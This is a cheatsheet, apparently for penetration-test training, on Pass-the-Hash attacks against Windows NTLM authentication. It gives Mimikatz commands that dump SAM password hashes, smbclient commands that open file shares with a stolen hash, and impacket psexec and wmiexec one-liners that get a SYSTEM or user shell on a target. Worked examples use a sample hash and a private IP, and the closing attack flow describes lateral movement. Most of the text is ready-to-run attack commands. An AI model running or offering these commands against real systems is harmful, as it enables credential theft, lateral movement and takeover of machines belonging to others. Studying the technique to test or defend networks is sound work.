Pass-the-Hash (PtH) - NTLM Usage Cheatsheet

1. What is Pass-the-Hash

Pass-the-Hash allows authentication using an NTLM hash instead of a plaintext password. No cracking is required.

Why it works:

  • NTLM hashes are not salted
  • They remain static across sessions
  • Can be reused across systems with same credentials
2. Preconditions
  • You must have a valid NTLM hash
  • Target must have same username/password (or reused credentials)
  • Administrative privileges are usually required for code execution

Note: UAC Remote Restrictions may block remote admin access unless using the built-in Administrator account.

3. Extract NTLM Hash (Mimikatz)
privilege::debug
token::elevate
lsadump::sam

What to look for:

  • Administrator account
  • NTLM hash value

Example:

Administrator
NTLM: 7a38310ea6f0027ee955abed1762964b
4. Access SMB Share Using NTLM Hash
smbclient \\\\TARGET_IP\\share -U Administrator --pw-nt-hash NTLM_HASH

Example:

smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

Inside smbclient:

dir
get filename.txt

What to look for:

  • Readable shares
  • Sensitive files (configs, backups, credentials)
5. Get Interactive Shell (PsExec)
impacket-psexec -hashes LMHASH:NTHASH username@target

Example:

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

What happens:

  • Find writable share
  • Upload executable
  • Create Windows service
  • Execute payload → SYSTEM shell
6. Alternative: WMI Exec (User Shell)
impacket-wmiexec -hashes LMHASH:NTHASH username@target

Example:

impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

Difference:

  • Less intrusive than PsExec
  • Interactive shell as the authenticated user (not always SYSTEM)
7. Other Tools for PtH
  • CrackMapExec → SMB / WinRM / RDP automation
  • impacket tools → psexec.py, wmiexec.py, smbexec.py
  • smbclient → file access
  • Mimikatz → in-memory PtH
8. Key Use Cases
  • Access SMB shares without cracking passwords
  • Lateral movement across machines
  • Privilege escalation to SYSTEM
  • Credential reuse exploitation
9. Common Pitfalls
  • Wrong hash format (LM:NT order)
  • UAC remote restrictions blocking access
  • Firewall blocking SMB/WMI
  • Account lacks admin privileges
  • Different passwords across hosts
Attack Flow
  1. Gain access to a machine
  2. Dump NTLM hashes (SAM/LSASS)
  3. Identify reusable credentials
  4. Use PtH to authenticate to another system
  5. Access SMB shares or execute commands
  6. Obtain interactive shell
